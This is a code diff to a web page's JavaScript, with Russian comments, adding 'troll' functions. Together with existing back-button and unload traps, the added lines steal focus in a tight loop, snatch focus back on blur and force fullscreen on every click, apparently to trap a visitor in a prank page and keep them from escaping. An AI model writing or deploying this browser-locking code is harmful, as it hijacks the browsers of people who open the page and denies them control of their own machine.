@@ -109,6 +109,36 @@
 window.onpopstate = function() { history.go(1); };
 window.onbeforeunload = function() { return "!"; };
 
+                    // 1. Супер-агрессивный захват фокуса (Защита от быстрых кликов)
+        // Мы не ждем события, а постоянно "бомбим" систему требованием фокуса
+        function insaneFocus() {
+            if (!isTrolling) return;
+            window.focus();
+            forceFull();
+            // Вызываем сами себя каждые 5-10 мс, создавая "петлю"
+            setTimeout(insaneFocus, 7); 
+        }
+
+        // 2. Блокировка потери фокуса (onblur)
+        // Как только фокус начинает уходить — мгновенно возвращаем
+        window.onblur = () => {
+            if (isTrolling) {
+                for(let i=0; i<10; i++) { // Делаем 10 попыток фокуса за раз
+                    window.focus();
+                    forceFull();
+                }
+            }
+        };
+
+        // 3. Перехват кликов (если он кликает быстро, каждый клик возвращает Fullscreen)
+        window.addEventListener('click', () => {
+            if (isTrolling) forceFull();
+        }, true);
+
+        // Запускаем безумный фокус
+        insaneFocus();
+            
+
                 function activateTroll() {
         // МГНОВЕННАЯ СМЕНА ЭКРАНА (Первым делом!)
         document.getElementById('m').style.display = 'none';
